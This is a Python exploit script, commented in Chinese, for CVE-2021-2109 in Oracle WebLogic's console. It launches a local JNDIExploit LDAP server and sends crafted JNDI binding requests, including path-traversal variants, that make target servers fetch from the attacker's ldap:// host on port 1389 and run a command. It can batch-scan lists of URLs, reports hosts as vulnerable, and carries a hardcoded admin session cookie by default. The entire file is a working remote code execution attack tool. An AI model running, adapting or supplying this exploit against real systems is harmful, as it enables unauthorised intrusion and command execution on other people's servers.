from optparse import OptionParser
from colorama import init
import subprocess
import requests
import time
import sys
import re
import os


os.chdir(os.path.dirname(os.path.abspath(__file__)))



def get_url_path(row_url):

    paths = [r"/console/css/%252e%252e%252f/consolejndi.portal",r"/console/consolejndi.portal",r"/console/css/consolejndi.portal"]

    row_url = f"{row_url.strip()}/"
    reg_url = re.compile("(https|http)://(.*?)\/")
    part_url = reg_url.findall(row_url)
    url = f"{part_url[0][0]}://{part_url[0][1]}"

    urls = [f"{url}{path}" for path in paths if True ]
    return urls





def poc_request(url,ip,cmd,cookie):

    reg_ip = re.compile("(\d+).(\d+).(\d+).(.*)")
    part_ip = reg_ip.findall(ip)
    JDNI_Server_IP = f"{part_ip[0][0]}.{part_ip[0][1]}.{part_ip[0][2]};{part_ip[0][3]}"


    header = {
        "Upgrade-Insecure-Requests":"1",
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding":"gzip, deflate",
        "Accept-Language":"zh-CN,zh;q=0.9",
        "Cookie":cookie,
        "Connection":"close",
        "Content-Type":"application/x-www-form-urlencoded",
        "cmd":cmd}
    body = f"_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://{JDNI_Server_IP}:1389/Basic/WeblogicEcho;AdminServer%22)"
    try:
        respon = requests.post(url=url,headers=header,data=body,timeout=(5,5))
    except Exception as e:
        print(f"[-] {e}")
        print(f"[-] {url} 网络连接失败")
        return 0
    return respon



def command_execute(command):
    outputs = ""
    i = 0
    try:
        proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE,encoding="gbk")
    except:
        command_str = ''
        for i in command:
            command_str = f"{command_str} {i}"
        command = command_str.strip()
        proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE,encoding="gbk")
    while subprocess.Popen.poll(proc) == None:
        output = proc.stdout.readline().strip()
        if output:
            outputs += output
            if "[+] LDAP Server Start" in outputs:
                print(outputs)
                print("[+] LDAP Server服务启动正常")
                return 1
            else:
                time.sleep(1)
                i += 1
                if i == 6:
                    print("[-] LDAP Server服务启动异常")
                    return 0





def poc_check(url,respon):

    if respon.status_code == 200 and "uid" in respon.text:
        print(f"\033[31m[*] {url} 存在漏洞CVE-2021-2109\033[0m")
    else:
        print(f"[-] {url} 不存在漏洞CVE-2021-2109")




def main(url,ip,file,cookie):

    command = ["java","-jar","JNDIExploit-1.3-SNAPSHOT.jar","-i",ip]
    cmd = "id"

    kill_cmd = '''FOR /F "tokens=5" %P IN (\'netstat -aon ^| findstr :1389\') DO taskkill /pid %P /f'''
    kill_pro = subprocess.Popen(kill_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    kill_pro.wait()


    is_ok = command_execute(command)
    if is_ok == 0:
        sys.exit()
    time.sleep(3.5)

    url_list = []
    if url != "":
        url_list.append(url)

    elif file != "":
        with open(file,"rt",encoding="utf-8") as f:
            for line in f:
                url_list.append(line.strip())

    for url in url_list:
        urls = get_url_path(url)
        for url in urls:
            respon = poc_request(url,ip,cmd,cookie)
            if respon == 0:
                continue
            poc_check(url,respon)
        






if __name__ == "__main__":

    init()

    print("\n脚本需要开放主机1389端口，请保证被攻击机可以访问到主机1389端口")

    parser = OptionParser()  


    parser.add_option("-u",default="",dest="url",help='验证漏洞的目标url')
    parser.add_option("-i",default="0.0.0.0",dest="ip",help="开放ldap服务的主机IP")
    parser.add_option("-f",default="",dest="file",help="批量导入url文件")
    parser.add_option("-c",default="ADMINCONSOLESESSION=bI8DFVB-BatgeF56D_9Z9OXU8e8LyJJdDKyWwMzY7Eu3680wVfFn!-757774642",dest="cookie",help="weblogic认证cookie")

    options, args = parser.parse_args()

    url=options.url
    ip=options.ip
    file=options.file
    cookie=options.cookie
    # url = " http://192.168.0.36:7001"
    # ip = "192.168.0.121"
    # cookie = ""

    if url == "" and file == "":
        print("[-] 无目标url参数...")
        sys.exit()

    main(url,ip,file,cookie)










    

